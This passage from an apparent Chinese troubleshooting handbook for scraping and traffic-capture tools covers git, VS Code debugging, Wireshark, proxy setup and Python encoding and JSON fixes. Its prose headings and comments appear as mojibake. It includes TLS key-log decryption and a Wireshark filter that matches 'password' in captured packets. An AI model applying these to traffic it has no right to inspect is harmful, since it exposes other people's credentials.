</code></pre>
      </div>

      <h3 id="è°ƒè¯•é…ç½®">è°ƒè¯•é…ç½®</h3>

      <p><strong>launch.json ç¤ºä¾‹</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="p">{</span>
<span class="w">    </span><span class="nt">&quot;version&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0.2.0&quot;</span><span class="p">,</span>
<span class="w">    </span><span class="nt">&quot;configurations&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
<span class="w">        </span><span class="p">{</span>
<span class="w">            </span><span class="nt">&quot;name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Python: Current File&quot;</span><span class="p">,</span>
<span class="w">            </span><span class="nt">&quot;type&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;python&quot;</span><span class="p">,</span>
<span class="w">            </span><span class="nt">&quot;request&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;launch&quot;</span><span class="p">,</span>
<span class="w">            </span><span class="nt">&quot;program&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;${file}&quot;</span><span class="p">,</span>
<span class="w">            </span><span class="nt">&quot;console&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;integratedTerminal&quot;</span><span class="p">,</span>
<span class="w">            </span><span class="nt">&quot;env&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="nt">&quot;PYTHONPATH&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;${workspaceFolder}&quot;</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">        </span><span class="p">},</span>
<span class="w">        </span><span class="p">{</span>
<span class="w">            </span><span class="nt">&quot;name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Node: Current File&quot;</span><span class="p">,</span>
<span class="w">            </span><span class="nt">&quot;type&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;node&quot;</span><span class="p">,</span>
<span class="w">            </span><span class="nt">&quot;request&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;launch&quot;</span><span class="p">,</span>
<span class="w">            </span><span class="nt">&quot;program&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;${file}&quot;</span><span class="p">,</span>
<span class="w">            </span><span class="nt">&quot;skipFiles&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;&lt;node_internals&gt;/**&quot;</span><span class="p">]</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">]</span>
<span class="p">}</span>
</code></pre>
      </div>

      <hr />

      <h2 id="git-é—®é¢˜">Git é—®é¢˜</h2>

      <h3 id="æ¨é€å¤±è´¥">æ¨é€å¤±è´¥</h3>

      <p><strong>é—®é¢˜</strong>: <code>! [rejected] ... (fetch first)</code></p>

      <p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># 1. å…ˆæ‹‰å–è¿œç¨‹æ›´æ”¹</span>
git<span class="w"> </span>pull<span class="w"> </span>origin<span class="w"> </span>main

<span class="c1"># 2. å¦‚æœæœ‰å†²çªï¼Œè§£å†³åæäº¤</span>
git<span class="w"> </span>add<span class="w"> </span>.
git<span class="w"> </span>commit<span class="w"> </span>-m<span class="w"> </span><span class="s2">&quot;Merge conflicts&quot;</span>

<span class="c1"># 3. æ¨é€</span>
git<span class="w"> </span>push<span class="w"> </span>origin<span class="w"> </span>main

<span class="c1"># å¼ºåˆ¶æ¨é€ (è°¨æ…ä½¿ç”¨)</span>
git<span class="w"> </span>push<span class="w"> </span>-f<span class="w"> </span>origin<span class="w"> </span>main
</code></pre>
      </div>

      <h3 id="å¤§æ–‡ä»¶é—®é¢˜">å¤§æ–‡ä»¶é—®é¢˜</h3>

      <p><strong>é—®é¢˜</strong>: æ–‡ä»¶è¿‡å¤§æ— æ³•æäº¤</p>

      <p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># 1. ä½¿ç”¨ Git LFS</span>
git<span class="w"> </span>lfs<span class="w"> </span>install
git<span class="w"> </span>lfs<span class="w"> </span>track<span class="w"> </span><span class="s2">&quot;*.psd&quot;</span>
git<span class="w"> </span>add<span class="w"> </span>.gitattributes

<span class="c1"># 2. ä»å†å²ä¸­ç§»é™¤å¤§æ–‡ä»¶</span>
git<span class="w"> </span>filter-branch<span class="w"> </span>--tree-filter<span class="w"> </span><span class="s1">&#39;rm -f large_file.zip&#39;</span><span class="w"> </span>HEAD

<span class="c1"># 3. ä½¿ç”¨ .gitignore</span>
<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;*.log&quot;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>.gitignore
<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;data/&quot;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>.gitignore
</code></pre>
      </div>

      <hr />

      <h2 id="wireshark-é—®é¢˜">Wireshark é—®é¢˜</h2>

      <h3 id="æ— æ³•æ•è·-https-å†…å®¹">æ— æ³•æ•è· HTTPS å†…å®¹</h3>

      <p><strong>é—®é¢˜</strong>: æŠ“åŒ…åªèƒ½çœ‹åˆ°åŠ å¯†æµé‡</p>

      <p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># 1. é…ç½® SSL/TLS å¯†é’¥æ—¥å¿—æ–‡ä»¶</span>

<span class="c1"># è®¾ç½®ç¯å¢ƒå˜é‡ (Chrome/Firefox)</span>
<span class="nb">export</span><span class="w"> </span><span class="nv">SSLKEYLOGFILE</span><span class="o">=</span>~/sslkeys.log<span class="w">  </span><span class="c1"># Linux/Mac</span>
<span class="nb">set</span><span class="w"> </span><span class="nv">SSLKEYLOGFILE</span><span class="o">=</span>C:<span class="se">\s</span>slkeys.log<span class="w">    </span><span class="c1"># Windows</span>

<span class="c1"># 2. åœ¨ Wireshark ä¸­é…ç½®</span>
<span class="c1"># Edit â†’ Preferences â†’ Protocols â†’ TLS</span>
<span class="c1"># (Pre)-Master-Secret log filename: é€‰æ‹©ä¸Šé¢çš„æ–‡ä»¶</span>

<span class="c1"># 3. é‡å¯æµè§ˆå™¨åæŠ“åŒ…,å°±èƒ½çœ‹åˆ°è§£å¯†å†…å®¹</span>
</code></pre>
      </div>

      <h3 id="è¿‡æ»¤è§„åˆ™">è¿‡æ»¤è§„åˆ™</h3>

      <p><strong>å¸¸ç”¨è¿‡æ»¤å™¨</strong>:</p>

      <pre><code># HTTP è¯·æ±‚
http.request

# ç‰¹å®šåŸŸå
http.host contains "example.com"

# ç‰¹å®š IP
ip.addr == 192.168.1.1

# ç«¯å£
tcp.port == 443

# åŒ…å«ç‰¹å®šå­—ç¬¦ä¸²
frame contains "password"
</code></pre>

      <hr />

      <h2 id="æŠ“åŒ…å·¥å…·é…ç½®">æŠ“åŒ…å·¥å…·é…ç½®</h2>

      <h3 id="ç³»ç»Ÿä»£ç†è®¾ç½®">ç³»ç»Ÿä»£ç†è®¾ç½®</h3>

      <h4 id="windows">Windows</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># è®¾ç½®ä»£ç†</span>
netsh<span class="w"> </span>winhttp<span class="w"> </span><span class="nb">set</span><span class="w"> </span>proxy<span class="w"> </span><span class="m">127</span>.0.0.1:8080

<span class="c1"># æŸ¥çœ‹ä»£ç†</span>
netsh<span class="w"> </span>winhttp<span class="w"> </span>show<span class="w"> </span>proxy

<span class="c1"># å–æ¶ˆä»£ç†</span>
netsh<span class="w"> </span>winhttp<span class="w"> </span>reset<span class="w"> </span>proxy
</code></pre>
      </div>

      <h4 id="macos">macOS</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># é€šè¿‡ networksetup</span>
sudo<span class="w"> </span>networksetup<span class="w"> </span>-setwebproxy<span class="w"> </span><span class="s2">&quot;Wi-Fi&quot;</span><span class="w"> </span><span class="m">127</span>.0.0.1<span class="w"> </span><span class="m">8080</span>
sudo<span class="w"> </span>networksetup<span class="w"> </span>-setsecurewebproxy<span class="w"> </span><span class="s2">&quot;Wi-Fi&quot;</span><span class="w"> </span><span class="m">127</span>.0.0.1<span class="w"> </span><span class="m">8080</span>

<span class="c1"># å…³é—­ä»£ç†</span>
sudo<span class="w"> </span>networksetup<span class="w"> </span>-setwebproxystate<span class="w"> </span><span class="s2">&quot;Wi-Fi&quot;</span><span class="w"> </span>off
sudo<span class="w"> </span>networksetup<span class="w"> </span>-setsecurewebproxystate<span class="w"> </span><span class="s2">&quot;Wi-Fi&quot;</span><span class="w"> </span>off
</code></pre>
      </div>

      <h4 id="linux">Linux</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># è®¾ç½®ç¯å¢ƒå˜é‡</span>
<span class="nb">export</span><span class="w"> </span><span class="nv">http_proxy</span><span class="o">=</span><span class="s2">&quot;http://127.0.0.1:8080&quot;</span>
<span class="nb">export</span><span class="w"> </span><span class="nv">https_proxy</span><span class="o">=</span><span class="s2">&quot;http://127.0.0.1:8080&quot;</span>

<span class="c1"># æ°¸ä¹…è®¾ç½® (æ·»åŠ åˆ° ~/.bashrc)</span>
<span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;export http_proxy=&quot;http://127.0.0.1:8080&quot;&#39;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>~/.bashrc
<span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;export https_proxy=&quot;http://127.0.0.1:8080&quot;&#39;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>~/.bashrc
</code></pre>
      </div>

      <hr />

      <h2 id="ç›¸å…³ç« èŠ‚">ğŸ“š ç›¸å…³ç« èŠ‚</h2>

      <ul>
        <li><a href="#02-Tooling-burp-suite-guide">Burp Suite æŒ‡å—</a></li>
        <li><a href="#02-Tooling-browser-devtools">Chrome DevTools</a></li>
        <li><a href="#02-Tooling-nodejs-debugging">Node.js è°ƒè¯•</a></li>
        <li><a href="#08-Cheat-Sheets-common-commands">å¸¸ç”¨å‘½ä»¤</a></li>
      </ul>

    </div>

    <div class="section" id="10-Troubleshooting-data-issues">
      <h2>79. Data Issues</h2>
      <h1 id="æ•°æ®å¤„ç†é—®é¢˜">æ•°æ®å¤„ç†é—®é¢˜</h1>

      <p>æ•°æ®é‡‡é›†ã€è§£æå’Œå­˜å‚¨ä¸­çš„å¸¸è§é—®é¢˜åŠè§£å†³æ–¹æ¡ˆã€‚</p>

      <hr />

      <h2 id="ç¼–ç é”™è¯¯">ç¼–ç é”™è¯¯</h2>

      <h3 id="unicodedecodeerror">UnicodeDecodeError</h3>

      <p><strong>é—®é¢˜è¡¨ç°</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="ne">UnicodeDecodeError</span><span class="p">:</span> <span class="s1">&#39;utf-8&#39;</span> <span class="n">codec</span> <span class="n">can</span><span class="s1">&#39;t decode byte 0xff in position 0</span>
</code></pre>
      </div>

      <p><strong>åŸå› </strong>: æ–‡ä»¶æˆ–æ•°æ®ä½¿ç”¨äº†ä¸åŒçš„ç¼–ç æ ¼å¼</p>

      <p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>

      <h4 id="1-è‡ªåŠ¨æ£€æµ‹ç¼–ç ">1. è‡ªåŠ¨æ£€æµ‹ç¼–ç </h4>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">chardet</span>

<span class="c1"># æ£€æµ‹æ–‡ä»¶ç¼–ç </span>
<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;file.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">raw_data</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">chardet</span><span class="o">.</span><span class="n">detect</span><span class="p">(</span><span class="n">raw_data</span><span class="p">)</span>
    <span class="n">encoding</span> <span class="o">=</span> <span class="n">result</span><span class="p">[</span><span class="s1">&#39;encoding&#39;</span><span class="p">]</span>
    <span class="n">confidence</span> <span class="o">=</span> <span class="n">result</span><span class="p">[</span><span class="s1">&#39;confidence&#39;</span><span class="p">]</span>

<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Encoding: </span><span class="si">{</span><span class="n">encoding</span><span class="si">}</span><span class="s2"> (Confidence: </span><span class="si">{</span><span class="n">confidence</span><span class="si">}</span><span class="s2">)&quot;</span><span class="p">)</span>

<span class="c1"># ä½¿ç”¨æ£€æµ‹åˆ°çš„ç¼–ç è¯»å–</span>
<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;file.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="n">encoding</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">content</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</code></pre>
      </div>

      <h4 id="2-å¤„ç†ç½‘é¡µç¼–ç ">2. å¤„ç†ç½‘é¡µç¼–ç </h4>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">chardet</span><span class="w"> </span><span class="kn">import</span> <span class="n">detect</span>

<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>

<span class="c1"># æ–¹æ³• 1: è®© requests è‡ªåŠ¨æ£€æµ‹</span>
<span class="n">response</span><span class="o">.</span><span class="n">encoding</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">apparent_encoding</span>
<span class="n">text</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span>

<span class="c1"># æ–¹æ³• 2: æ‰‹åŠ¨æ£€æµ‹</span>
<span class="n">encoding</span> <span class="o">=</span> <span class="n">detect</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">content</span><span class="p">)[</span><span class="s1">&#39;encoding&#39;</span><span class="p">]</span>
<span class="n">text</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">content</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">encoding</span><span class="p">,</span> <span class="n">errors</span><span class="o">=</span><span class="s1">&#39;ignore&#39;</span><span class="p">)</span>

<span class="c1"># æ–¹æ³• 3: å°è¯•å¸¸è§ç¼–ç </span>
<span class="n">encodings</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;utf-8&#39;</span><span class="p">,</span> <span class="s1">&#39;gbk&#39;</span><span class="p">,</span> <span class="s1">&#39;gb2312&#39;</span><span class="p">,</span> <span class="s1">&#39;gb18030&#39;</span><span class="p">,</span> <span class="s1">&#39;big5&#39;</span><span class="p">]</span>
<span class="k">for</span> <span class="n">enc</span> <span class="ow">in</span> <span class="n">encodings</span><span class="p">:</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">text</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">content</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">enc</span><span class="p">)</span>
        <span class="k">break</span>
    <span class="k">except</span> <span class="ne">UnicodeDecodeError</span><span class="p">:</span>
        <span class="k">continue</span>
</code></pre>
      </div>

      <h4 id="3-å¿½ç•¥é”™è¯¯å­—ç¬¦">3. å¿½ç•¥é”™è¯¯å­—ç¬¦</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># å¿½ç•¥æ— æ³•è§£ç çš„å­—ç¬¦</span>
<span class="n">text</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">,</span> <span class="n">errors</span><span class="o">=</span><span class="s1">&#39;ignore&#39;</span><span class="p">)</span>

<span class="c1"># æˆ–æ›¿æ¢ä¸º ?</span>
<span class="n">text</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">,</span> <span class="n">errors</span><span class="o">=</span><span class="s1">&#39;replace&#39;</span><span class="p">)</span>

<span class="c1"># æˆ–ä½¿ç”¨æ›¿ä»£æ–¹æ¡ˆ</span>
<span class="n">text</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">,</span> <span class="n">errors</span><span class="o">=</span><span class="s1">&#39;backslashreplace&#39;</span><span class="p">)</span>
</code></pre>
      </div>

      <h3 id="unicodeencodeerror">UnicodeEncodeError</h3>

      <p><strong>é—®é¢˜è¡¨ç°</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="ne">UnicodeEncodeError</span><span class="p">:</span> <span class="s1">&#39;ascii&#39;</span> <span class="n">codec</span> <span class="n">can</span><span class="s1">&#39;t encode character &#39;</span>\<span class="n">u4e2d</span><span class="s1">&#39;</span>
</code></pre>
      </div>

      <p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># å†™å…¥æ–‡ä»¶æ—¶æŒ‡å®šç¼–ç </span>
<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;output.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">chinese_text</span><span class="p">)</span>

<span class="c1"># æ‰“å°åˆ°æ§åˆ¶å° (Windows)</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">io</span>
<span class="n">sys</span><span class="o">.</span><span class="n">stdout</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">TextIOWrapper</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">buffer</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>

<span class="c1"># JSON è¾“å‡ºä¿ç•™ä¸­æ–‡</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">json</span>
<span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">ensure_ascii</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">indent</span><span class="o">=</span><span class="mi">2</span><span class="p">)</span>
</code></pre>
      </div>

      <hr />

      <h2 id="json-è§£æå¤±è´¥">JSON è§£æå¤±è´¥</h2>

      <h3 id="jsondecodeerror">JSONDecodeError</h3>

      <p><strong>é—®é¢˜è¡¨ç°</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="n">json</span><span class="o">.</span><span class="n">decoder</span><span class="o">.</span><span class="n">JSONDecodeError</span><span class="p">:</span> <span class="n">Expecting</span> <span class="n">value</span><span class="p">:</span> <span class="n">line</span> <span class="mi">1</span> <span class="n">column</span> <span class="mi">1</span> <span class="p">(</span><span class="n">char</span> <span class="mi">0</span><span class="p">)</span>
</code></pre>
      </div>

      <p><strong>åŸå› åˆ†æ</strong>:</p>

      <ol>
        <li>å“åº”ä¸æ˜¯ JSON æ ¼å¼</li>
        <li>JSON æ ¼å¼é”™è¯¯</li>
        <li>ç©ºå“åº”</li>
        <li>HTML é”™è¯¯é¡µé¢</li>
      </ol>

      <p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>

      <h4 id="1-æ£€æŸ¥å“åº”å†…å®¹">1. æ£€æŸ¥å“åº”å†…å®¹</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">json</span>

<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>

<span class="c1"># å…ˆæ£€æŸ¥çŠ¶æ€ç </span>
<span class="k">if</span> <span class="n">response</span><span class="o">.</span><span class="n">status_code</span> <span class="o">!=</span> <span class="mi">200</span><span class="p">:</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Error: </span><span class="si">{</span><span class="n">response</span><span class="o">.</span><span class="n">status_code</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
    <span class="n">exit</span><span class="p">()</span>

<span class="c1"># æ£€æŸ¥ Content-Type</span>
<span class="n">content_type</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">headers</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;Content-Type&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
<span class="k">if</span> <span class="s1">&#39;application/json&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">content_type</span><span class="p">:</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Warning: Content-Type is </span><span class="si">{</span><span class="n">content_type</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

<span class="c1"># å®‰å…¨è§£æ</span>
<span class="k">try</span><span class="p">:</span>
    <span class="n">data</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">json</span><span class="p">()</span>
<span class="k">except</span> <span class="n">json</span><span class="o">.</span><span class="n">JSONDecodeError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;JSON Parse Error: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Response text: </span><span class="si">{</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">[:</span><span class="mi">500</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>  <span class="c1"># æ‰“å°å‰500å­—ç¬¦</span>
    <span class="n">data</span> <span class="o">=</span> <span class="kc">None</span>
</code></pre>
      </div>

      <h4 id="2-å¤„ç†ç•¸å½¢-json">2. å¤„ç†ç•¸å½¢ JSON</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">json5</span>  <span class="c1"># pip install json5</span>

<span class="c1"># json5 å¯ä»¥è§£æå¸¦æ³¨é‡Šã€å°¾éšé€—å·çš„ JSON</span>
<span class="n">text</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;</span>
<span class="s1">{</span>
<span class="s1">    &quot;name&quot;: &quot;value&quot;,  // æ³¨é‡Š</span>
<span class="s1">    &quot;items&quot;: [1, 2, 3,],  // å°¾éšé€—å·</span>
<span class="s1">}</span>
<span class="s1">&#39;&#39;&#39;</span>

<span class="n">data</span> <span class="o">=</span> <span class="n">json5</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">text</span><span class="p">)</span>
</code></pre>
      </div>

      <h4 id="3-ä¿®å¤å¸¸è§-json-é—®é¢˜">3. ä¿®å¤å¸¸è§ JSON é—®é¢˜</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">re</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">json</span>

<span class="k">def</span><span class="w"> </span><span class="nf">fix_json</span><span class="p">(</span><span class="n">text</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;ä¿®å¤å¸¸è§çš„ JSON é—®é¢˜&quot;&quot;&quot;</span>
    <span class="c1"># ç§»é™¤ JavaScript æ³¨é‡Š</span>
    <span class="n">text</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;//.*?\n&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">text</span><span class="p">)</span>
    <span class="n">text</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;/\*.*?\*/&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="n">text</span><span class="p">,</span> <span class="n">flags</span><span class="o">=</span><span class="n">re</span><span class="o">.</span><span class="n">DOTALL</span><span class="p">)</span>

    <span class="c1"># ç§»é™¤å°¾éšé€—å·</span>
    <span class="n">text</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;,\s*}&#39;</span><span class="p">,</span> <span class="s1">&#39;}&#39;</span><span class="p">,</span> <span class="n">text</span><span class="p">)</span>
    <span class="n">text</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;,\s*]&#39;</span><span class="p">,</span> <span class="s1">&#39;]&#39;</span><span class="p">,</span> <span class="n">text</span><span class="p">)</span>

    <span class="c1"># å•å¼•å·è½¬åŒå¼•å· (è°¨æ…ä½¿ç”¨)</span>
    <span class="c1"># text = text.replace(&quot;&#39;&quot;, &#39;&quot;&#39;)</span>

    <span class="k">return</span> <span class="n">text</span>

<span class="c1"># ä½¿ç”¨</span>
<span class="n">text</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span>
<span class="n">fixed_text</span> <span class="o">=</span> <span class="n">fix_json</span><span class="p">(</span><span class="n">text</span><span class="p">)</span>
<span class="n">data</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">fixed_text</span><span class="p">)</span>
</code></pre>
      </div>

      <h4 id="4-ä»-html-ä¸­æå–-json">4. ä» HTML ä¸­æå– JSON</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">re</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">json</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">bs4</span><span class="w"> </span><span class="kn">import</span> <span class="n">BeautifulSoup</span>

<span class="n">html</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span>

<span class="c1"># æ–¹æ³• 1: ä» script æ ‡ç­¾æå–</span>
<span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">html</span><span class="p">,</span> <span class="s1">&#39;lxml&#39;</span><span class="p">)</span>
<span class="n">script</span> <span class="o">=</span> <span class="n">soup</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s1">&#39;script&#39;</span><span class="p">,</span> <span class="p">{</span><span class="s1">&#39;id&#39;</span><span class="p">:</span> <span class="s1">&#39;initial-data&#39;</span><span class="p">})</span>
<span class="k">if</span> <span class="n">script</span><span class="p">:</span>
    <span class="n">data</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">script</span><span class="o">.</span><span class="n">string</span><span class="p">)</span>

<span class="c1"># æ–¹æ³• 2: ä½¿ç”¨æ­£åˆ™æå–</span>
<span class="n">match</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;var\s+data\s*=\s*({.*?});&#39;</span><span class="p">,</span> <span class="n">html</span><span class="p">,</span> <span class="n">re</span><span class="o">.</span><span class="n">DOTALL</span><span class="p">)</span>
<span class="k">if</span> <span class="n">match</span><span class="p">:</span>
    <span class="n">json_str</span> <span class="o">=</span> <span class="n">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">data</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">json_str</span><span class="p">)</span>

<span class="c1"># æ–¹æ³• 3: æå– JSON-LD</span>
<span class="n">script</span> <span class="o">=</span> <span class="n">soup</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s1">&#39;script&#39;</span><span class="p">,</span> <span class="p">{</span><span class="s1">&#39;type&#39;</span><span class="p">:</span> <span class="s1">&#39;application/ld+json&#39;</span><span class="p">})</span>
<span class="k">if</span> <span class="n">script</span><span class="p">:</span>
    <span class="n">data</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">script</span><span class="o">.</span><span class="n">string</span><span class="p">)</span>
</code></pre>
      </div>

      <hr />

      <h2 id="æ•°æ®åº“è¿æ¥é—®é¢˜">æ•°æ®åº“è¿æ¥é—®é¢˜</h2>

      <h3 id="mongodb-è¿æ¥å¤±è´¥">MongoDB è¿æ¥å¤±è´¥</h3>

      <p><strong>é—®é¢˜è¡¨ç°</strong>:</p>

      <div class="codehilite">
